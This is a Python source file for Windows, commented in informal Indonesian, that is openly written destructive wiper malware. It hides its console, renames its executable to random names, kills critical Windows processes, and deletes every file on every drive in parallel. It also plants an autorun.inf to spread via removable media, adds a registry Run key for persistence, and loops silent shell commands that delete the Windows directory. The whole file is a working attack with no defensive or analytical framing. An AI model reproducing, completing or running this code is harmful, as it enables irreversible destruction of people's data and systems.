import os
import shutil
import subprocess
import random
import string
import winreg
import psutil
from multiprocessing import Process
import ctypes
import sys

# Sembunyiin jendela biar silent
def hide_window():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Fungsi buat generate string acak buat obfuscation
def random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Fungsi buat matiin proses kunci
def kill_critical_processes():
    critical_processes = ["explorer.exe", "svchost.exe", "csrss.exe"]
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() in critical_processes:
                proc.kill()
        except:
            pass

# Fungsi buat hapus data di satu drive
def wipe_drive(drive):
    try:
        for root, dirs, files in os.walk(drive, topdown=False):
            for name in files:
                try:
                    os.chmod(os.path.join(root, name), 0o777)
                    os.remove(os.path.join(root, name))
                except:
                    pass
            for name in dirs:
                try:
                    shutil.rmtree(os.path.join(root, name), ignore_errors=True)
                except:
                    pass
    except:
        pass

# Fungsi buat hapus semua drive pake multiprocessing
def wipe_all_drives():
    drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
    processes = []
    for drive in drives:
        p = Process(target=wipe_drive, args=(drive,))
        processes.append(p)
        p.start()
    for p in processes:
        p.join()

# Fungsi buat bikin autorun.inf
def create_autorun():
    exe_name = f"{random_string(10)}.exe"
    autorun_content = f"""
    [AutoRun]
    open={exe_name}
    action=Open
    shell\\open\\command={exe_name}
    shell=Open
    """
    try:
        with open("autorun.inf", "w") as f:
            f.write(autorun_content)
        os.rename(os.path.abspath(sys.executable), os.path.join(os.path.dirname(os.path.abspath(sys.executable)), exe_name))
    except:
        pass

# Fungsi buat persistensi di registry
def add_to_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, random_string(10), 0, winreg.REG_SZ, os.path.abspath(sys.executable))
        winreg.CloseKey(key)
    except:
        pass

# Fungsi buat bikin sistem crash
def crash_system():
    while True:
        try:
            subprocess.call("del /q /s /f %windir%\\*.*", shell=True, creationflags=0x08000000)  # Silent mode
            subprocess.call("rd /s /q %windir%", shell=True, creationflags=0x08000000)
        except:
            pass

# Main function
def main():
    # Sembunyiin proses
    hide_window()
    
    # Ganti nama proses biar gak mencurigakan
    try:
        os.rename(os.path.abspath(sys.executable), f"{random_string(10)}.exe")
    except:
        pass

    # Jalankan semua fungsi di proses terpisah
    Process(target=kill_critical_processes).start()
    Process(target=wipe_all_drives).start()
    Process(target=create_autorun).start()
    Process(target=add_to_registry).start()
    Process(target=crash_system).start()

if __name__ == "__main__":
    main()
